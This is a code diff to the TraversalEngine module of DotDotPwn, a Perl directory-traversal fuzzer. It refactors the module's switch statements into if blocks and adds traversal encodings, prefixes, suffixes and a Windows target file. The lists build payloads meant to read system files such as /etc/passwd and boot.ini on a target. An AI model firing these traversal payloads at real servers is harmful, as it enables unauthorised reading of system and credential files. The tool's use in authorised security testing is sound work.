@@ -27,17 +27,17 @@ package DotDotPwn::TraversalEngine;
 use Exporter 'import';
 @EXPORT = qw(TraversalEngine);
 
-use Switch;
+#use Switch;
 
 # Traversal strings to be returned (and after, launched against the target).
 my @Traversals;
 
 # Specific files in Windows b0xes
-my @Windows_files = ("boot.ini", "\\windows\\system32\\drivers\\etc\\hosts");
+my @Windows_files = ('boot.ini', '\windows\win.ini', '\windows\system32\drivers\etc\hosts');
                      # "autoexec.bat"); YOU CAN ALSO ADD THESE AND MORE UNDER YOUR CONSIDERATION
 
 # Specific files in UNIX-based b0xes
-my @Unix_files = ("/etc/passwd", "/etc/issue");
+my @Unix_files = ('/etc/passwd', '/etc/issue');
                   # "/etc/motd", /etc/issue.net"); YOU CAN ALSO ADD THESE AND MORE UNDER YOUR CONSIDERATION
 
 # Extra files (only included if -E switch is enabled)
@@ -48,6 +48,7 @@ my @Extra_files = ("config.inc.php", "web.config");
 # Dots (..) representations to be combined in the Traversal Engine
 our @Dots = ("..",
              ".%00.",
+             "..%00",
              "..%01",
              ".?", "??", "?.",
              "%5C..",
@@ -90,9 +91,9 @@ our @Slashes = ("/", "\\",
 # of it would increase drastically the number of Traversals.
 #
 my  @Special_Prefix_Patterns = ("A", ".", "./", ".\\");
-my  @Special_Prefixes = ("///", "\\\\\\");
+my  @Special_Prefixes = ("///", "\\\\\\", "\\\.", "C:\\");
 my  @Special_Mid_Patterns = ("../", "..\\");
-my  @Special_Sufixes = ("%00", "%00index.html", "%00index.htm", ";index.html", ";index.htm");
+my  @Special_Sufixes = ("%00", "?", " ", "%00index.html", "%00index.htm", ";index.html", ";index.htm");
 our @Special_Patterns = ("..//", "..///", "..\\\\", "..\\\\\\", "../\\", "..\\/",
                          "../\\/", "..\\/\\", "\\../", "/..\\", ".../", "...\\",
                         "./../", ".\\..\\", ".//..//", ".\\\\..\\\\","......///",
@@ -174,31 +175,30 @@ sub TraversalEngine{
 	if(!$file){
 		print "[+] Adapting the filenames according to the OS type detected (" . $OS_type . ")\n" if $main::module ne "stdout";
 		foreach $trav (@Traversal_Strings){
-			switch($OS_type){
-				case "unix" {
-					foreach $filename (@Unix_files){
-						$fname = fname_first_slash_deletion($filename);
-						push @Traversals, $trav . fname_slash_encoding($fname, $trav);
-					}
-				}
-				case "windows" {
-					foreach $filename (@Windows_files){
-						$fname = fname_first_slash_deletion($filename);
-						push @Traversals, $trav . fname_slash_encoding($fname, $trav);
-					}
-				}
-				case "generic" {
-					foreach $filename (@Unix_files){
-						$fname = fname_first_slash_deletion($filename);
-						push @Traversals, $trav . fname_slash_encoding($fname, $trav);
-					}
-
-					foreach $filename (@Windows_files){
-						$fname = fname_first_slash_deletion($filename);
-						push @Traversals, $trav . fname_slash_encoding($fname, $trav);
-					}
+			# switch($OS_type){
+		        if ($OS_type eq "unix") {
+				foreach $filename (@Unix_files){
+					$fname = fname_first_slash_deletion($filename);
+					push @Traversals, $trav . fname_slash_encoding($fname, $trav);
 				}
 			}
+		        if ($OS_type eq "windows") {
+				foreach $filename (@Windows_files){
+					$fname = fname_first_slash_deletion($filename);
+					push @Traversals, $trav . fname_slash_encoding($fname, $trav);
+				}
+			}
+			if ($OS_type eq "generic") {
+				foreach $filename (@Unix_files){
+					$fname = fname_first_slash_deletion($filename);
+					push @Traversals, $trav . fname_slash_encoding($fname, $trav);
+				}
+				foreach $filename (@Windows_files){
+					$fname = fname_first_slash_deletion($filename);
+					push @Traversals, $trav . fname_slash_encoding($fname, $trav);
+				}
+			}
+			#}
 
 			# Inclusion of the extra files if the -E switch is enabled
 			if($main::extra_f){
@@ -219,27 +219,26 @@ sub TraversalEngine{
 	print "[+] Including Special sufixes\n" if $main::module ne "stdout";
 	# Finally, include the sufixes in @Special_Sufixes
 	if(!$file){
-		switch($OS_type){
-			case "unix" {
-				foreach $filename (@Unix_files){
-					special_trav_sufixes($filename, $deep);
-				}
-			}
-			case "windows" {
-				foreach $filename (@Windows_files){
-					special_trav_sufixes($filename, $deep);
-				}
-			}
-			case "generic" {
-				foreach $filename (@Unix_files){
-					special_trav_sufixes($filename, $deep);
-				}
-
-				foreach $filename (@Windows_files){
-					special_trav_sufixes($filename, $deep);
-				}
+		#switch($OS_type){
+	        if ($OS_type eq "unix") {
+			foreach $filename (@Unix_files){
+				special_trav_sufixes($filename, $deep);
 			}
 		}
+		if ($OS_type eq "windows") {
+			foreach $filename (@Windows_files){
+				special_trav_sufixes($filename, $deep);
+			}
+		}
+		if ($OS_type eq "generic") {
+			foreach $filename (@Unix_files){
+				special_trav_sufixes($filename, $deep);
+			}
+                        foreach $filename (@Windows_files){
+				special_trav_sufixes($filename, $deep);
+			}
+		}
+		#}
 
 		# Inclusion of the extra files if the -E switch is enabled
 		if($main::extra_f){
